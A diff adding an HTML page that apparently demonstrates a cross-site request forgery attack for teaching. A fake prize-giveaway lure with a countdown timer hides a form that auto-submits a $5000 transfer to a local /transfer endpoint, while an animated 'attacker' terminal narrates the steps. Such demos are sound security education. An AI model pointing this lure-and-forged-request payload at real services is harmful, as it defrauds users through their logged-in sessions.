@@ -1,0 +1,244 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>🎉 YOU WON! Claim your iPhone 15 Pro</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: 'Inter', system-ui, sans-serif;
+  min-height: 100vh;
+  background: linear-gradient(135deg, #ffd93d 0%, #ff6b9d 50%, #c44dff 100%);
+  color: #1a1a1a;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  overflow: hidden;
+  position: relative;
+}
+body::before {
+  content: '🎉 🎊 💰 🎁 ⭐ 🏆 💎 🎯';
+  position: absolute;
+  inset: 0;
+  font-size: 40px;
+  opacity: 0.15;
+  word-spacing: 80px;
+  line-height: 120px;
+  overflow: hidden;
+  pointer-events: none;
+  animation: drift 20s linear infinite;
+}
+@keyframes drift { from { transform: translate(0,0); } to { transform: translate(-80px, -120px); } }
+.card {
+  position: relative;
+  background: white;
+  border-radius: 28px;
+  padding: 48px 40px;
+  max-width: 520px;
+  width: 100%;
+  text-align: center;
+  box-shadow: 0 30px 80px rgba(0,0,0,0.3);
+  border: 4px solid #fff;
+}
+.badge {
+  display: inline-block;
+  background: #ff4757;
+  color: white;
+  padding: 6px 14px;
+  border-radius: 999px;
+  font-size: 12px;
+  font-weight: 700;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  margin-bottom: 16px;
+  animation: pulse 1.2s infinite;
+}
+@keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+h1 {
+  font-size: 38px;
+  font-weight: 800;
+  line-height: 1.1;
+  margin-bottom: 12px;
+  background: linear-gradient(135deg, #ff4757, #c44dff);
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+}
+.prize { font-size: 72px; margin: 12px 0; }
+.subtitle {
+  font-size: 16px;
+  color: #555;
+  margin-bottom: 28px;
+  line-height: 1.5;
+}
+.timer {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 28px;
+  font-weight: 700;
+  color: #ff4757;
+  margin-bottom: 8px;
+}
+.timer-label { font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 24px; }
+.claim-btn {
+  display: inline-block;
+  background: linear-gradient(135deg, #ff4757, #c44dff);
+  color: white;
+  border: none;
+  padding: 18px 48px;
+  font-size: 20px;
+  font-weight: 700;
+  font-family: inherit;
+  border-radius: 999px;
+  cursor: pointer;
+  box-shadow: 0 10px 30px rgba(196, 77, 255, 0.4);
+  transition: transform 0.15s, box-shadow 0.2s;
+  letter-spacing: 0.02em;
+}
+.claim-btn:hover { transform: translateY(-2px); box-shadow: 0 14px 40px rgba(196, 77, 255, 0.5); }
+.claim-btn:active { transform: translateY(0); }
+.fine {
+  margin-top: 20px;
+  font-size: 11px;
+  color: #aaa;
+  letter-spacing: 0.02em;
+}
+
+.overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(8, 9, 13, 0.96);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 100;
+  padding: 24px;
+  color: #eceef3;
+  font-family: 'JetBrains Mono', monospace;
+}
+.overlay.active { display: flex; }
+.terminal {
+  background: #0f1117;
+  border: 1px solid #22252f;
+  border-radius: 14px;
+  padding: 24px;
+  max-width: 680px;
+  width: 100%;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+}
+.terminal-head {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding-bottom: 16px;
+  border-bottom: 1px solid #22252f;
+  margin-bottom: 16px;
+}
+.dot { width: 12px; height: 12px; border-radius: 50%; }
+.dot.r { background: #ff5f56; }
+.dot.y { background: #ffbd2e; }
+.dot.g { background: #27c93f; }
+.terminal-title { margin-left: 10px; color: #7a7d8a; font-size: 12px; }
+.log { font-size: 14px; line-height: 1.9; min-height: 280px; }
+.log .line { opacity: 0; transform: translateY(4px); transition: all 0.3s; }
+.log .line.show { opacity: 1; transform: translateY(0); }
+.log .ok { color: #2dd4bf; }
+.log .warn { color: #ffbd2e; }
+.log .err { color: #ff4757; }
+.log .muted { color: #7a7d8a; }
+.log .accent { color: #c3b8ff; }
+.cursor { display: inline-block; width: 8px; height: 14px; background: #2dd4bf; vertical-align: middle; animation: blink 1s infinite; }
+@keyframes blink { 50% { opacity: 0; } }
+.pill {
+  display: inline-block;
+  padding: 3px 8px;
+  border-radius: 4px;
+  background: rgba(255, 71, 87, 0.15);
+  color: #ff4757;
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  margin-bottom: 12px;
+  text-transform: uppercase;
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="badge">🔥 Limited Offer</div>
+  <h1>CONGRATULATIONS!<br/>You're our 1,000,000th visitor!</h1>
+  <div class="prize">📱💰🎁</div>
+  <div class="subtitle">
+    You've been selected to receive a <strong>brand new iPhone 15 Pro</strong>
+    and <strong>$5,000 cash</strong>. Claim now before the timer runs out!
+  </div>
+  <div class="timer" id="timer">02:47</div>
+  <div class="timer-label">Time remaining</div>
+  <button class="claim-btn" onclick="startAttack()">🎁 CLAIM MY PRIZE NOW</button>
+  <div class="fine">* No purchase necessary. 100% free. We promise.</div>
+</div>
+
+<form id="evil" action="http://localhost:3000/transfer" method="POST" style="display:none">
+  <input name="to" value="bob" />
+  <input name="amount" value="5000" />
+  <input name="note" value="Thanks for the iPhone 🎁" />
+</form>
+
+<div class="overlay" id="overlay">
+  <div class="terminal">
+    <div class="terminal-head">
+      <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+      <span class="terminal-title">attacker@shadow ~ /csrf_exploit.sh</span>
+    </div>
+    <div class="pill">● CSRF ATTACK IN PROGRESS</div>
+    <div class="log" id="log"></div>
+  </div>
+</div>
+
+<script>
+  let mins = 2, secs = 47;
+  setInterval(() => {
+    if (secs-- === 0) { secs = 59; if (mins > 0) mins--; }
+    document.getElementById('timer').textContent =
+      String(mins).padStart(2,'0') + ':' + String(secs).padStart(2,'0');
+  }, 1000);
+
+  const steps = [
+    { t: 0,    cls: 'muted',  html: '$ ./csrf_exploit.sh --target localhost:3000' },
+    { t: 350,  cls: 'muted',  html: '[*] Victim browser has active session? <span class="ok">yes</span>' },
+    { t: 850,  cls: 'muted',  html: '[*] Cookie attributes: <span class="warn">SameSite=None, HttpOnly=false</span>' },
+    { t: 1350, cls: 'muted',  html: '[*] Target endpoint: <span class="accent">POST /transfer</span>' },
+    { t: 1800, cls: 'muted',  html: '[*] CSRF token required? <span class="ok">NO</span> — no defense present' },
+    { t: 2300, cls: 'warn',   html: '[+] Crafting forged request...' },
+    { t: 2750, cls: 'muted',  html: '    → to:     <span class="accent">bob</span>' },
+    { t: 2950, cls: 'muted',  html: '    → amount: <span class="accent">$5000</span>' },
+    { t: 3150, cls: 'muted',  html: '    → note:   <span class="accent">Thanks for the iPhone 🎁</span>' },
+    { t: 3650, cls: 'err',    html: '[!] Submitting hidden form as victim...' },
+    { t: 4400, cls: 'ok',     html: '[✓] Request delivered. Victim\'s session cookie attached by browser.' },
+    { t: 5000, cls: 'err',    html: '[$$$] $5000 transferred. Victim has no idea. <span class="cursor"></span>' },
+  ];
+
+  function startAttack() {
+    const overlay = document.getElementById('overlay');
+    const log = document.getElementById('log');
+    overlay.classList.add('active');
+
+    steps.forEach(s => {
+      setTimeout(() => {
+        const div = document.createElement('div');
+        div.className = 'line ' + s.cls;
+        div.innerHTML = s.html;
+        log.appendChild(div);
+        requestAnimationFrame(() => div.classList.add('show'));
+      }, s.t);
+    });
+
+    setTimeout(() => { document.getElementById('evil').submit(); }, 5400);
+  }
+</script>
+</body>
+</html>
